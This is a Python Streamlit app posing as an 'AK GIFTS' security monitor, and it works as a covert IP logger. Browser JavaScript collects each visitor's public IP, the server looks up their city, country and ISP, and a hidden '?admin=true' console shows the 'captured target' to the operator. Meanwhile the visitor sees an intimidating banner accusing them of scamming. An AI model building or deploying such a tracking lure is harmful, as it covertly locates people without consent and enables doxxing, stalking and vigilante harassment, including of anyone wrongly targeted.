import streamlit as st
import pandas as pd
import requests
from datetime import datetime
from streamlit_javascript import st_javascript

# 1. Page Config
st.set_page_config(page_title="AK GIFTS | Internal Security", page_icon="🛡️", layout="wide")

# 2. THE IP TRAP (JavaScript Method)
# This forces the browser to find the REAL public IP
def get_client_ip():
    url = 'https://api64.ipify.org?format=json'
    script = f'await fetch("{url}").then(r => r.json())'
    try:
        result = st_javascript(script)
        if result and isinstance(result, dict):
            return result.get("ip")
    except:
        pass
    return None

client_ip = get_client_ip()

# 3. Location Lookup (Only if IP is found)
location_info = "Scanning..."
isp_info = "Calculating..."

if client_ip:
    try:
        # Silently log to console for your "Manage App" view
        print(f"!!! TARGET DETECTED: {client_ip} !!!")
        
        # Get location data
        res = requests.get(f"http://ip-api.com/json/{client_ip}").json()
        if res.get("status") == "success":
            location_info = f"{res.get('city')}, {res.get('country')}"
            isp_info = res.get("isp")
    except:
        location_info = "Trace Blocked"

# 4. Dashboard Visuals
st.markdown("""
    <style>
    .warning-glow {
        color: #ff4b4b; font-weight: bold; font-size: 28px;
        text-shadow: 0 0 15px #ff4b4b; border: 2px solid #ff4b4b;
        padding: 20px; text-align: center; border-radius: 10px;
    }
    .footer { position: fixed; left: 0; bottom: 0; width: 100%; text-align: center; color: #444; padding: 10px; }
    </style>
    """, unsafe_allow_html=True)

st.title("🎁 AK GIFTS | Security Monitor")
st.markdown('<div class="warning-glow">⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN</div>', unsafe_allow_html=True)
st.divider()

# 5. Metrics
c1, c2, c3 = st.columns(3)
c1.metric("TRACED IP", client_ip if client_ip else "DETECTING...")
c2.metric("LOCATION", location_info.split(",")[0])
c3.metric("STATUS", "COMPROMISED", delta="-100%")

# 6. Admin Panel (Hidden)
# To see this, visit: your-link.streamlit.app/?admin=true
if st.query_params.get("admin") == "true":
    st.subheader("🕵️ ENKODER ADMIN CONSOLE")
    if client_ip:
        st.success(f"Target Captured: {client_ip}")
        st.write(f"**City/Country:** {location_info}")
        st.write(f"**Provider:** {isp_info}")
    else:
        st.warning("No target has clicked yet.")

st.markdown('<div class="footer">MADE BY ENKODER.</div>', unsafe_allow_html=True)
